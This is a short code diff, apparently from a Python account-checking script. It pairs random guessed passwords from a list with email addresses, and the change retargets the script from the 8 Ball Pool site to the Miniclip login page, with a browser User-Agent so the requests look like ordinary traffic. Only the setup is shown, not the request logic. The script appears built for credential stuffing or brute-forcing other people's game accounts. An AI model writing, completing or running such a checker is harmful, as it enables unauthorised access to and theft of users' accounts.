@@ -14,7 +14,7 @@ def generate_password():
     return random.choice(passwords)
 
 def check_account(email, password):
-    url = "https://8ballpool.com"
+    url = "https://miniclip.com/login"
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Content-Type": "application/x-www-form-urlencoded"
